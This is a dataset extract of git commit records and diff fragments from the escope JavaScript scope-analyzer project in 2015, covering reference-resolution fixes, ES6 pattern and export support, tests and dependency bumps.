""""""<\n>-        var a = 0;<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 1<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.be.null  # the references of var declarations on global don't resolve because those are dynamic.<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""var a = 0;"" should have a writable reference in function.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function foo() {<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[1]<\n>-        expect(reference.writeExpr).to.not.be.undefined<\n>-        expect(reference.isWrite()).to.be.true<\n>-        expect(reference.isRead()).to.be.false<\n>-    it '""function a() {} a();"" should not have references on global.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function a() {}<\n>-        a();<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # [global<c> a]<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.variables).to.have.length 1<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.be.null  # the references of var declarations on global don't resolve because those are dynamic.<\n>-        expect(reference.isWrite()).to.be.false<\n>-        expect(reference.isRead()).to.be.true<\n>-    it '""function a() {} a();"" should have a readable reference in function.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function foo() {<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> a]<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>-        expect(scope.references).to.have.length 1<\n>-        reference = scope.references[0]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'a'<\n>-        expect(reference.resolved).to.equal scope.variables[1]<\n>-        expect(reference.isWrite()).to.be.false<\n>-        expect(reference.isRead()).to.be.true<\n>-    it '""class A {} new A();"" should have a readable reference on global.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        class A {}<\n>-        let a = new A();<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2  # [global<c> A]<\n>-        scope = scopeManager.scopes[0]<\n>-        expect(scope.variables).to.have.length 2  # [A<c> a]<\n>-        expect(scope.references).to.have.length 2  # [a<c> A]<\n>-        reference = scope.references[1]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'A'<\n>-        expect(reference.resolved).to.equal scope.variables[0]<\n>-        expect(reference.isWrite()).to.be.false<\n>-        expect(reference.isRead()).to.be.true<\n>-    it '""class A {} new A();"" should have a readable reference in function.'<c> -><\n>-        ast = harmony.parse """"""<\n>-        function foo() {<\n>-            let a = new A();<\n>-        }<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 3 # [global<c> foo<c> A]<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.variables).to.have.length 3  # [arguments<c> A<c> a]<\n>-        expect(scope.references).to.have.length 2  # [a<c> A]<\n>-        reference = scope.references[1]<\n>-        expect(reference.from).to.equal scope<\n>-        expect(reference.identifier.name).to.equal 'A'<\n>-        expect(reference.resolved).to.equal scope.variables[1]<\n>-        expect(reference.isWrite()).to.be.false<\n>-        expect(reference.isRead()).to.be.true<\n>",F
17,56,56,569,4,26,Toru Nagashima,103,3,460,33,User,0,2574,Thu,22,43,7 May 2015,Fix the reference resolving logic for global. - References of `let`/`const`/`class` declarations should be resolved statically on the global scope also. - Add very simple test cases.,0,1,1,259,11996,"+    __shouldStaticallyCloseForGlobal(ref) {<\n>+        // On global scope<c> let/const/class declarations should be resolved statically.<\n>+        var name = ref.identifier.name;<\n>+        if (!this.set.has(name)) {<\n>+            return false;<\n>+        var variable = this.set.get(name);<\n>+        //TODO: Confirm the mean of array<c> and rewrite.<\n>+        var def = variable.defs[0];<\n>+        return def != null && (<\n>+            (def.type === Variable.ClassName) ||<\n>+            (def.type === Variable.Variable && def.parent.kind !== ""var"")<\n>+        );<\n>+    __staticCloseRef(ref) {<\n>+        if (!this.__resolve(ref)) {<\n>+            this.__delegateToUpperScope(ref);<\n>+        }<\n>+    }<\n>+    __dynamicCloseRef(ref) {<\n>+        // notify all names are through to global<\n>+        let current = this;<\n>+        do {<\n>+            current.through.push(ref);<\n>+            current = current.upper;<\n>+        } while (current);<\n>+    }<\n>+    __globalCloseRef(ref) {<\n>+        // let/const/class declarations should be resolved statically.<\n>+        // others should be resolved dynamically.<\n>+        if (this.__shouldStaticallyCloseForGlobal(ref)) {<\n>+            this.__staticCloseRef(ref);<\n>+        }<\n>+        else {<\n>+            this.__dynamicCloseRef(ref);<\n>+        var closeRef;<\n>+            closeRef = this.__staticCloseRef;<\n>+        } else if (this.type !== 'global') {<\n>+            closeRef = this.__dynamicCloseRef;<\n>+            closeRef = this.__globalCloseRef;<\n>+        // Try Resolving all references in this scope.<\n>+        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>+            let ref = this.__left[i];<\n>+            closeRef.call(this<c> ref);<\n>+        }<\n>+# -*- coding: utf-8 -*-<\n>+#  Copyright (C) 2015 Toru Nagashima<\n>+#<\n>+#  Redistribution and use in source and binary forms<c> with or without<\n>+#  modification<c> are permitted provided that the following conditions are met:<\n>+#<\n>+#    * Redistributions of source code must retain the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer.<\n>+#    * Redistributions in binary form must reproduce the above copyright<\n>+#      notice<c> this list of conditions and the following disclaimer in the<\n>+#      documentation and/or other materials provided with the distribution.<\n>+#<\n>+#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+expect = require('chai').expect<\n>+harmony = require '../third_party/esprima'<\n>+escope = require '..'<\n>+describe 'References:'<c> -><\n>+    it '""let a = 0;"" should have a writable reference on global.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        let a = 0;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 1<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[0]<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""let a = 0;"" should have a writable reference in function.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo() {<\n>+            let a = 0;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[1]<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""const a = 0;"" should have a writable reference on global.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        const a = 0;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 1<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[0]<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""const a = 0;"" should have a writable reference in function.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo() {<\n>+            const a = 0;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[1]<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""var a = 0;"" should not have references on global.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        var a = 0;<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 1<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.be.null  # the references of var declarations on global don't resolve because those are dynamic.<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""var a = 0;"" should have a writable reference in function.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo() {<\n>+            var a = 0;<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[1]<\n>+        expect(reference.writeExpr).to.not.be.undefined<\n>+        expect(reference.isWrite()).to.be.true<\n>+        expect(reference.isRead()).to.be.false<\n>+    it '""function a() {} a();"" should not have references on global.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function a() {}<\n>+        a();<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # [global<c> a]<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.variables).to.have.length 1<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.be.null  # the references of var declarations on global don't resolve because those are dynamic.<\n>+        expect(reference.isWrite()).to.be.false<\n>+        expect(reference.isRead()).to.be.true<\n>+    it '""function a() {} a();"" should have a readable reference in function.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo() {<\n>+            function a() {}<\n>+            a();<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> a]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.variables).to.have.length 2  # [arguments<c> a]<\n>+        expect(scope.references).to.have.length 1<\n>+        reference = scope.references[0]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'a'<\n>+        expect(reference.resolved).to.equal scope.variables[1]<\n>+        expect(reference.isWrite()).to.be.false<\n>+        expect(reference.isRead()).to.be.true<\n>+    it '""class A {} new A();"" should have a readable reference on global.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        class A {}<\n>+        let a = new A();<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2  # [global<c> A]<\n>+        scope = scopeManager.scopes[0]<\n>+        expect(scope.variables).to.have.length 2  # [A<c> a]<\n>+        expect(scope.references).to.have.length 2  # [a<c> A]<\n>+        reference = scope.references[1]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'A'<\n>+        expect(reference.resolved).to.equal scope.variables[0]<\n>+        expect(reference.isWrite()).to.be.false<\n>+        expect(reference.isRead()).to.be.true<\n>+    it '""class A {} new A();"" should have a readable reference in function.'<c> -><\n>+        ast = harmony.parse """"""<\n>+        function foo() {<\n>+            class A {}<\n>+            let a = new A();<\n>+        }<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 3 # [global<c> foo<c> A]<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.variables).to.have.length 3  # [arguments<c> A<c> a]<\n>+        expect(scope.references).to.have.length 2  # [a<c> A]<\n>+        reference = scope.references[1]<\n>+        expect(reference.from).to.equal scope<\n>+        expect(reference.identifier.name).to.equal 'A'<\n>+        expect(reference.resolved).to.equal scope.variables[1]<\n>+        expect(reference.isWrite()).to.be.false<\n>+        expect(reference.isRead()).to.be.true<\n>+# vim: set sw=4 ts=4 et tw=80 :<\n>","-    __staticClose(scopeManager) {<\n>-        // static resolve<\n>-        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-            let ref = this.__left[i];<\n>-            if (!this.__resolve(ref)) {<\n>-                this.__delegateToUpperScope(ref);<\n>-            }<\n>-    __dynamicClose(scopeManager) {<\n>-        // This path is for ""global"" and ""function with eval"" environment.<\n>-        for (let i = 0<c> iz = this.__left.length; i < iz; ++i) {<\n>-            // notify all names are through to global<\n>-            let ref = this.__left[i];<\n>-            let current = this;<\n>-            do {<\n>-                current.through.push(ref);<\n>-                current = current.upper;<\n>-            } while (current);<\n>-            this.__staticClose();<\n>-            this.__dynamicClose();<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,5,47,15 Mar 2015,Fix gulpfile.js tagging code,0,0,1,4,96,+        .pipe(tagVersion({<\n>+            prefix: ''<\n>+        }));<\n>,-        .pipe(tagVersion());<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,58,15 Mar 2015,Bumps package version,0,0,1,2,46,"+  ""version"": ""3.0.1""<c><\n>","-  ""version"": ""3.0.0""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,57,15 Mar 2015,Dont use |this| before calling super(),0,0,1,6,126,+        super();<\n>+        super();<\n>+        super();<\n>,-        super(this);<\n>-        super(this);<\n>-        super(this<c> this);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,57,15 Mar 2015,Upgrade estraverse / esrecurse to 3.1.x,0,0,1,4,112,"+    ""esrecurse"": ""^3.1.1""<c><\n>+    ""estraverse"": ""^3.1.0""<\n>","-    ""esrecurse"": ""^3.0.0""<c><\n>-    ""estraverse"": ""^3.0.0""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,1,15 Mar 2015,Bumps package version,0,0,1,2,50,"+  ""version"": ""3.0.0""<c><\n>","-  ""version"": ""2.0.2-dev""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,4,0,15 Mar 2015,Use coffee-script/register for mocha,0,0,2,13,509,"+    eslint = require('gulp-eslint')<c><\n>+    coffee = require('coffee-script/register');<\n>+gulp.task('test'<c> [ 'build' ]<c> function () {<\n>+    ""babel"": ""^4.7.12""<c><\n>",-    eslint = require('gulp-eslint');<\n>-var POWERED = [ 'powered-test/*.js' ];<\n>-gulp.task('powered-test'<c> function () {<\n>-        .pipe(sourcemaps.init())<\n>-        .pipe(coffee())<\n>-        .pipe(sourcemaps.write())<\n>-        .pipe(gulp.dest('./powered-test/'));<\n>-gulp.task('test'<c> [ 'build'<c> 'powered-test' ]<c> function () {<\n>-    return gulp.src(POWERED)<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,27,15 Mar 2015,Use wrapped RestElement ref #53,0,0,2,6,221,"+    ""acorn"": ""^0.12.0""<c><\n>+            this.visitPattern({<\n>+                type: 'RestElement'<c><\n>+                argument: node.rest<\n>+            }<c> (pattern) => {<\n>",-            this.visitPattern(node.rest<c> (pattern) => {<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,3,22,15 Mar 2015,Upgrade for estree CatchClause,0,0,4,36,1563,"+    ""esrecurse"": ""^3.0.0""<c><\n>+    ""estraverse"": ""^3.0.0""<\n>+espree = require '../third_party/espree'<\n>+        scope = scopeManager.scopes[3]<\n>+        expect(scope.type).to.be.equal 'block'<\n>+        expect(scope.block.type).to.be.equal 'BlockStatement'<\n>+        expect(scope.isStrict).to.be.false<\n>+        expect(scope.variables).to.have.length 2<\n>+        expect(scope.variables.map((variable) -> variable.name)).to.be.eql([<\n>+            'e'<\n>+            'c'<\n>+        ])<\n>+        expect(scope.references.map((ref) -> ref.identifier.name)).to.be.eql([<\n>+            'e'<\n>+            'a'<\n>+            'b'<\n>+            'c'<\n>+            'c'<\n>+            'd'<\n>+        ])<\n>+        createTryStatement: function (block<c> handler<c> finalizer) {<\n>+                handler: handler<c><\n>+        var block<c> handler = null<c> finalizer = null<c> marker = markerCreate();<\n>+            handler = parseCatchClause();<\n>+        if (!handler && !finalizer) {<\n>+        return markerApply(marker<c> delegate.createTryStatement(block<c> handler<c> finalizer));<\n>","-    ""esrecurse"": ""^2.0.0""<c><\n>-    ""estraverse"": ""^2.0.0""<\n>-        console.log(scope.references)<\n>-        createTryStatement: function (block<c> guardedHandlers<c> handlers<c> finalizer) {<\n>-                guardedHandlers: guardedHandlers<c><\n>-                handlers: handlers<c><\n>-        var block<c> handlers = []<c> finalizer = null<c> marker = markerCreate();<\n>-            handlers.push(parseCatchClause());<\n>-        if (handlers.length === 0 && !finalizer) {<\n>-        return markerApply(marker<c> delegate.createTryStatement(block<c> []<c> handlers<c> finalizer));<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Sun,2,44,15 Mar 2015,Upgrade dev dependencies,0,0,1,8,230,"+    ""esprima"": ""^2.1.0""<c><\n>+    ""gulp-bump"": ""^0.3.0""<c><\n>+    ""gulp-eslint"": ""^0.6.0""<c><\n>+    ""gulp-plumber"": ""^1.0.0""<c><\n>","-    ""esprima"": ""~1.2.2""<c><\n>-    ""gulp-bump"": ""^0.2.2""<c><\n>-    ""gulp-eslint"": ""^0.5.0""<c><\n>-    ""gulp-plumber"": ""^0.6.6""<c><\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,10,31,11 Mar 2015,Support AssignmentPattern This is used for default values. After that we need to drop default parameter support. CAUTION: Theres no fully supported TDZ scope yet.,0,0,2,158,6224,"+import { Syntax } from 'estraverse';<\n>+class PatternVisitor extends esrecurse.Visitor {<\n>+    constructor(rootPattern<c> referencer<c> callback) {<\n>+        super(this);<\n>+        this.referencer = referencer;<\n>+        this.callback = callback;<\n>+    }<\n>+    perform(pattern) {<\n>+        if (pattern.type === Syntax.Identifier) {<\n>+            this.callback(pattern<c> true);<\n>+            return;<\n>+        }<\n>+        this.visit(pattern);<\n>+    }<\n>+    Identifier(pattern) {<\n>+        this.callback(pattern<c> false);<\n>+    }<\n>+    ObjectPattern(pattern) {<\n>+        var i<c> iz<c> property;<\n>+        for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>+            property = pattern.properties[i];<\n>+            if (property.shorthand) {<\n>+                this.visit(property.key);<\n>+                continue;<\n>+            }<\n>+            this.visit(property.value);<\n>+        }<\n>+    }<\n>+    ArrayPattern(pattern) {<\n>+        var i<c> iz<c> element;<\n>+        for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>+            element = pattern.elements[i];<\n>+            if (element) {<\n>+                this.visit(element);<\n>+    }<\n>+    AssignmentPattern(pattern) {<\n>+        this.visit(pattern.left);<\n>+        // FIXME: Condier TDZ scope.<\n>+        this.referencer.visit(pattern.right);<\n>+    }<\n>+function traverseIdentifierInPattern(rootPattern<c> referencer<c> callback) {<\n>+    var visitor = new PatternVisitor(rootPattern<c> referencer<c> callback);<\n>+    visitor.perform(rootPattern);<\n>+    return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement || nodeType === Syntax.RestElement || nodeType === Syntax.AssignmentPattern;<\n>+        traverseIdentifierInPattern(node<c> this<c> callback);<\n>+espree = require '../third_party/espree'<\n>+    it 'default values and patterns in var'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            var [a<c> b<c> c<c> d = 20 ] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 5<\n>+        for name<c> index in [<\n>+                'arguments'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.be.equal name<\n>+        expect(scope.references).to.have.length 5<\n>+        for name<c> index in [<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'array'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>+    it 'default values containing references and patterns in var'<c> -><\n>+        ast = espree """"""<\n>+        (function () {<\n>+            var [a<c> b<c> c<c> d = e ] = array;<\n>+        }());<\n>+        """"""<\n>+        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>+        expect(scopeManager.scopes).to.have.length 2<\n>+        scope = scopeManager.scopes[0]<\n>+        globalScope = scope<\n>+        expect(scope.type).to.be.equal 'global'<\n>+        expect(scope.variables).to.have.length 0<\n>+        expect(scope.references).to.have.length 0<\n>+        scope = scopeManager.scopes[1]<\n>+        expect(scope.type).to.be.equal 'function'<\n>+        expect(scope.variables).to.have.length 5<\n>+        for name<c> index in [<\n>+                'arguments'<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+            ]<\n>+            expect(scope.variables[index].name).to.be.equal name<\n>+        expect(scope.references).to.have.length 6<\n>+        for name<c> index in [<\n>+                'a'<\n>+                'b'<\n>+                'c'<\n>+                'd'<\n>+                'e'<\n>+                'array'<\n>+            ]<\n>+            expect(scope.references[index].identifier.name).to.be.equal name<\n>",-import estraverse from 'estraverse';<\n>-const Syntax = estraverse.Syntax;<\n>-function traverseIdentifierInPattern(rootPattern<c> callback) {<\n>-    estraverse.traverse(rootPattern<c> {<\n>-        enter(pattern<c> parent) {<\n>-            var i<c> iz<c> element<c> property;<\n>-            switch (pattern.type) {<\n>-                case Syntax.Identifier:<\n>-                    // Toplevel identifier.<\n>-                    if (parent === null) {<\n>-                        callback(pattern<c> true);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.SpreadElement:<\n>-                    if (pattern.argument.type === Syntax.Identifier) {<\n>-                        callback(pattern.argument<c> false);<\n>-                    }<\n>-                    break;<\n>-                case Syntax.ObjectPattern:<\n>-                    for (i = 0<c> iz = pattern.properties.length; i < iz; ++i) {<\n>-                        property = pattern.properties[i];<\n>-                        if (property.shorthand) {<\n>-                            callback(property.key<c> false);<\n>-                            continue;<\n>-                        }<\n>-                        if (property.value.type === Syntax.Identifier) {<\n>-                            callback(property.value<c> false);<\n>-                            continue;<\n>-                        }<\n>-                    }<\n>-                    break;<\n>-                case Syntax.ArrayPattern:<\n>-                    for (i = 0<c> iz = pattern.elements.length; i < iz; ++i) {<\n>-                        element = pattern.elements[i];<\n>-                        if (element && element.type === Syntax.Identifier) {<\n>-                            callback(element<c> false);<\n>-                        }<\n>-                    }<\n>-                    break;<\n>-    });<\n>-    return nodeType === Syntax.Identifier || nodeType === Syntax.ObjectPattern || nodeType === Syntax.ArrayPattern || nodeType === Syntax.SpreadElement;<\n>-        traverseIdentifierInPattern(node<c> callback);<\n>-        // FIXME: Don't consider initializer with complex patterns.<\n>-        // Such as<c><\n>-        // var [a<c> b<c> c = 20] = array;<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,8,56,11 Mar 2015,Fully support ES6 export declaration with estree spec Already tested with test/es6-export.coffee. Ref #51,0,0,3,36,1108,"+    ""esrecurse"": ""^2.0.0""<c><\n>+    ""estraverse"": ""^2.0.0""<\n>+    visitExportDeclaration(node) {<\n>+    ExportDeclaration(node) {<\n>+        this.visitExportDeclaration(node);<\n>+    }<\n>+    ExportNamedDeclaration(node) {<\n>+        this.visitExportDeclaration(node);<\n>+    }<\n>+        let local = (node.id || node.local);<\n>+        this.visit(local);<\n>+espree = require '../third_party/espree'<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>+        console.log(scope.references)<\n>+        ast = espree """"""<\n>+        ast = espree """"""<\n>","-    ""esrecurse"": ""^1.2.0""<c><\n>-    ""estraverse"": ""^1.9.1""<\n>-    ExportDeclaration(node) {<\n>-        this.visit(node.id);<\n>-harmony = require '../third_party/esprima'<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>-        ast = harmony.parse """"""<\n>",F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,4,12,11 Mar 2015,Remove AST modification for node.local,0,0,1,14,599,+        let local = (node.local || node.id);<\n>+        if (local) {<\n>+            this.visitImport(local<c> node);<\n>+        let local = (node.local || node.id);<\n>+        this.visitImport(local<c> node);<\n>+        let local = (node.local || node.id);<\n>+            this.visitImport(local<c> node);<\n>,-        node.local = (node.local || node.id);<\n>-        if (node.local) {<\n>-            this.visitImport(node.local<c> node);<\n>-        node.local = (node.local || node.id);<\n>-        this.visitImport(node.local<c> node);<\n>-        node.local = (node.local || node.id);<\n>-            this.visitImport(node.local<c> node);<\n>,F
17,56,56,569,4,26,Yusuke Suzuki,114,405,619,197,User,0,4042,Wed,1,46,11 Mar 2015,Merge pull request #52 from fczuardi/issue_51 change the referencer to support import as described in the ESTree spec (fixes #51),0,0,0,0,0,,,F
